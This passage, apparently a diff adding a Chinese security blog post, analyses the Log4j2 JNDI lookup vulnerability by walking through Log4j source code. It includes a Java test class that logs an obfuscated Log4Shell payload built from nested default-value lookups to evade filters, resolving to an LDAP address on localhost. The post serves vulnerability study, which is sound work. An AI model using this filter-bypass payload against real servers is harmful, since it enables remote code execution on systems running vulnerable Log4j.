+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">prefixPos</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">defaultLookup</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">event</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">defaultLookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">var</span><span class="o">)</span> <span class="o">:</span> <span class="n">defaultLookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">var</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/dc567b7d1fcc5de55e2308e8b6ac459b.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/dc567b7d1fcc5de55e2308e8b6ac459b.png, https://img.mi3aka.eu.org/2023/02/dc567b7d1fcc5de55e2308e8b6ac459b.png 1.5x, https://img.mi3aka.eu.org/2023/02/dc567b7d1fcc5de55e2308e8b6ac459b.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/dc567b7d1fcc5de55e2308e8b6ac459b.png"
+        title="https://img.mi3aka.eu.org/2023/02/dc567b7d1fcc5de55e2308e8b6ac459b.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.core.lookup.JndiLookup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="n">String</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="n">String</span> <span class="n">jndiName</span> <span class="o">=</span> <span class="n">convertJndiName</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">(</span><span class="kd">final</span> <span class="n">JndiManager</span> <span class="n">jndiManager</span> <span class="o">=</span> <span class="n">JndiManager</span><span class="o">.</span><span class="na">getDefaultManager</span><span class="o">())</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Objects</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">jndiManager</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">jndiName</span><span class="o">),</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="kd">final</span> <span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">LOGGER</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="n">LOOKUP</span><span class="o">,</span> <span class="s">&#34;Error looking up JNDI resource [{}].&#34;</span><span class="o">,</span> <span class="n">jndiName</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>jndiManager.lookup</code>进行JNDI注入</p>
+<h2 id="递归解析与混淆">递归解析与混淆</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/8fc8b0789d7cd2e3ed7f1a95efcc0ab8.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/8fc8b0789d7cd2e3ed7f1a95efcc0ab8.png, https://img.mi3aka.eu.org/2023/02/8fc8b0789d7cd2e3ed7f1a95efcc0ab8.png 1.5x, https://img.mi3aka.eu.org/2023/02/8fc8b0789d7cd2e3ed7f1a95efcc0ab8.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/8fc8b0789d7cd2e3ed7f1a95efcc0ab8.png"
+        title="https://img.mi3aka.eu.org/2023/02/8fc8b0789d7cd2e3ed7f1a95efcc0ab8.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/44996397a811a57c3d64a5f25784f884.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/44996397a811a57c3d64a5f25784f884.png, https://img.mi3aka.eu.org/2023/02/44996397a811a57c3d64a5f25784f884.png 1.5x, https://img.mi3aka.eu.org/2023/02/44996397a811a57c3d64a5f25784f884.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/44996397a811a57c3d64a5f25784f884.png"
+        title="https://img.mi3aka.eu.org/2023/02/44996397a811a57c3d64a5f25784f884.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.LogManager</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.apache.logging.log4j.Logger</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">log4j2bypass</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">log4j2rce</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">logger</span><span class="o">.</span><span class="na">fatal</span><span class="o">(</span><span class="s">&#34;${${1234:-j}${1234:-n}${45334576:-d}${34241234:-i}:${1234:-l}${1234:-d}${1234:-a}${1234:-p}://${1234:-1}${1234:-2}7.0.0.1:1389/exp}&#34;</span><span class="o">);</span><span class="c1">//bypass
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样对<code>substitute</code>方法进行分析</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/8408677fe3244a20fb121153e0ceae5c.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/8408677fe3244a20fb121153e0ceae5c.png, https://img.mi3aka.eu.org/2023/02/8408677fe3244a20fb121153e0ceae5c.png 1.5x, https://img.mi3aka.eu.org/2023/02/8408677fe3244a20fb121153e0ceae5c.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/8408677fe3244a20fb121153e0ceae5c.png"
+        title="https://img.mi3aka.eu.org/2023/02/8408677fe3244a20fb121153e0ceae5c.png" /></p>
+<p>由于存在<code>${${}}</code>的嵌套情况,因此进行了多次递归处理</p>
+<p>以第一个<code>${1234:-j}</code>为例,对<code>valueDelimiterMatcher</code>进行分析,在去除<code>${}</code>后,对<code>1234:-j</code>进行拆分处理</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/bb5557b29e6bea3bf09699a568a5a428.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/bb5557b29e6bea3bf09699a568a5a428.png, https://img.mi3aka.eu.org/2023/02/bb5557b29e6bea3bf09699a568a5a428.png 1.5x, https://img.mi3aka.eu.org/2023/02/bb5557b29e6bea3bf09699a568a5a428.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/bb5557b29e6bea3bf09699a568a5a428.png"
+        title="https://img.mi3aka.eu.org/2023/02/bb5557b29e6bea3bf09699a568a5a428.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/35288934b215b8db01b64c73948f5ccc.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/35288934b215b8db01b64c73948f5ccc.png, https://img.mi3aka.eu.org/2023/02/35288934b215b8db01b64c73948f5ccc.png 1.5x, https://img.mi3aka.eu.org/2023/02/35288934b215b8db01b64c73948f5ccc.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/35288934b215b8db01b64c73948f5ccc.png"
+        title="https://img.mi3aka.eu.org/2023/02/35288934b215b8db01b64c73948f5ccc.png" /></p>
+<p>对拆分出的<code>1234</code>进行resolve处理,最终返回null</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/210b5596f1302d884cef823e3c89e496.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/210b5596f1302d884cef823e3c89e496.png, https://img.mi3aka.eu.org/2023/02/210b5596f1302d884cef823e3c89e496.png 1.5x, https://img.mi3aka.eu.org/2023/02/210b5596f1302d884cef823e3c89e496.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/210b5596f1302d884cef823e3c89e496.png"
+        title="https://img.mi3aka.eu.org/2023/02/210b5596f1302d884cef823e3c89e496.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/3647b5dd5c0b2dab5fc8f8dcb2c5fb7f.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/3647b5dd5c0b2dab5fc8f8dcb2c5fb7f.png, https://img.mi3aka.eu.org/2023/02/3647b5dd5c0b2dab5fc8f8dcb2c5fb7f.png 1.5x, https://img.mi3aka.eu.org/2023/02/3647b5dd5c0b2dab5fc8f8dcb2c5fb7f.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/3647b5dd5c0b2dab5fc8f8dcb2c5fb7f.png"
+        title="https://img.mi3aka.eu.org/2023/02/3647b5dd5c0b2dab5fc8f8dcb2c5fb7f.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="n">String</span> <span class="n">var</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">var</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">int</span> <span class="n">prefixPos</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">PREFIX_SEPARATOR</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">prefixPos</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">prefix</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">prefixPos</span><span class="o">).</span><span class="na">toLowerCase</span><span class="o">(</span><span class="n">Locale</span><span class="o">.</span><span class="na">US</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">prefixPos</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">StrLookup</span> <span class="n">lookup</span> <span class="o">=</span> <span class="n">strLookupMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">prefix</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">lookup</span> <span class="k">instanceof</span> <span class="n">ConfigurationAware</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="o">((</span><span class="n">ConfigurationAware</span><span class="o">)</span> <span class="n">lookup</span><span class="o">).</span><span class="na">setConfiguration</span><span class="o">(</span><span class="n">configuration</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">lookup</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">value</span> <span class="o">=</span> <span class="n">event</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">lookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">:</span> <span class="n">lookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">value</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">var</span> <span class="o">=</span> <span class="n">var</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">prefixPos</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">defaultLookup</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">event</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">defaultLookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">var</span><span class="o">)</span> <span class="o">:</span> <span class="n">defaultLookup</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">var</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">lookup</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">key</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">final</span> <span class="kt">boolean</span> <span class="n">isMapMessage</span> <span class="o">=</span> <span class="n">event</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">event</span><span class="o">.</span><span class="na">getMessage</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">MapMessage</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">map</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">isMapMessage</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">map</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">map</span><span class="o">.</span><span class="na">containsKey</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">String</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">map</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">obj</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">isMapMessage</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">((</span><span class="n">MapMessage</span><span class="o">)</span> <span class="n">event</span><span class="o">.</span><span class="na">getMessage</span><span class="o">()).</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/5d3c516e7b14476b376f3f167521accf.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/5d3c516e7b14476b376f3f167521accf.png, https://img.mi3aka.eu.org/2023/02/5d3c516e7b14476b376f3f167521accf.png 1.5x, https://img.mi3aka.eu.org/2023/02/5d3c516e7b14476b376f3f167521accf.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/5d3c516e7b14476b376f3f167521accf.png"
+        title="https://img.mi3aka.eu.org/2023/02/5d3c516e7b14476b376f3f167521accf.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span> <span class="n">varValue</span> <span class="o">=</span> <span class="n">resolveVariable</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">varName</span><span class="o">,</span> <span class="n">buf</span><span class="o">,</span> <span class="n">startPos</span><span class="o">,</span> <span class="n">endPos</span><span class="o">);</span><span class="c1">//varValue为null
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="o">(</span><span class="n">varValue</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">varValue</span> <span class="o">=</span> <span class="n">varDefaultValue</span><span class="o">;</span><span class="c1">//此时varValue为j
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span><span class="n">varValue</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// recursive replace
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">final</span> <span class="kt">int</span> <span class="n">varLen</span> <span class="o">=</span> <span class="n">varValue</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">buf</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="n">startPos</span><span class="o">,</span> <span class="n">endPos</span><span class="o">,</span> <span class="n">varValue</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">altered</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">change</span> <span class="o">=</span> <span class="n">substitute</span><span class="o">(</span><span class="n">event</span><span class="o">,</span> <span class="n">buf</span><span class="o">,</span> <span class="n">startPos</span><span class="o">,</span> <span class="n">varLen</span><span class="o">,</span> <span class="n">priorVariables</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">change</span> <span class="o">=</span> <span class="n">change</span> <span class="o">+</span> <span class="o">(</span><span class="n">varLen</span> <span class="o">-</span> <span class="o">(</span><span class="n">endPos</span> <span class="o">-</span> <span class="n">startPos</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pos</span> <span class="o">+=</span> <span class="n">change</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bufEnd</span> <span class="o">+=</span> <span class="n">change</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">lengthChange</span> <span class="o">+=</span> <span class="n">change</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">chars</span> <span class="o">=</span> <span class="n">getChars</span><span class="o">(</span><span class="n">buf</span><span class="o">);</span> <span class="c1">// in case buffer was altered
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// chars被调整为j${1234:-n}
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不断重复上述操作,直到chars被调整为<code>jndi:ldap://127.0.0.1:1389/exp</code>,进行lookup操作</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-12-03</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/fastjson/" class="prev" rel="prev" title="fastjson分析"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>fastjson分析</a>
+            <a href="/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0%E9%80%9F%E8%AE%B0%E7%BD%AE%E9%A1%B6/" class="next" rel="next" title="日常学习速记[置顶]">日常学习速记[置顶]<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://giscus.app">Giscus</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script 